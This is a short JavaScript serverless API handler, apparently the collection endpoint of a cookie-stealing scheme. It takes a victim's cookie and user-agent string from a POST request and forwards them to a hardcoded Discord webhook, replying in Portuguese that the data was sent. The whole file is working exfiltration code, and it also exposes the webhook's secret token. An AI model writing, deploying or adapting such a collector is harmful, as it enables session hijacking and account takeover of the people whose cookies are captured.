export default async function handler(req, res) {
  const { cookie, ua } = req.body || {}
  const webhook = "https://discord.com/api/webhooks/1391100473494470850/eEp6ydXja0MP9iSjkgD3q_DF5PSodCvgNm1yvGnY3iXECrtruy9k44MaODs9fu8j01oE"

  await fetch(webhook, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      content: `🍪 Cookie: \`${cookie || 'nada'}\`\n📱 UA: \`${ua || 'nulo'}\``
    })
  })

  res.status(200).json({ status: "Enviado pro DK" })
}
